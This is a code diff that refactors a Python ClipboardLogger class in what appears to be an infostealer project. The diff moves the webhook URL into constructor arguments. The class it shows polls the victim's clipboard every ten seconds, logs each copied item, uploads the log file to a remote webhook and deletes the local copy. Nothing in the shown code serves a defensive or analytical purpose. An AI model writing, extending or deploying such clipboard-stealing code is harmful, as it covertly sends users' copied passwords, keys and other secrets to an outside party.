@@ -1,4 +1,3 @@
-from main import SOFTWARE_DIR_NAME, WEBHOOK_URL
 from utils import *
 
 import pyperclip
@@ -7,8 +6,10 @@ import os
 
 
 class ClipboardLogger:
-    def __init__(self):
-        self.log_file = os.path.join(get_logs_path(SOFTWARE_DIR_NAME), "clipboard_logs.txt")
+    def __init__(self, software_dir_name, webhook_url):
+        self.software_dir_name = software_dir_name
+        self.webhook_url = webhook_url
+        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "clipboard_log.txt")
         self.interval = 10
         self.last_copied = ""
 
@@ -24,10 +25,10 @@ class ClipboardLogger:
             self.last_copied = copied
             with open(self.log_file, "a") as f:
                 f.write(f"{copied}\n")
-            send_webhook(WEBHOOK_URL, file={"clipboard_logs.txt": open(self.log_file, "rb")})
+            send_webhook(self.webhook_url, file={"clipboard_logs.txt": open(self.log_file, "rb")})
             os.remove(self.log_file)
         except Exception as e:
-            send_webhook(WEBHOOK_URL, f"Error logging clipboard: {e}")
+            send_webhook(self.webhook_url, f"Error logging clipboard: {e}")
 
     def start(self):
         while True:
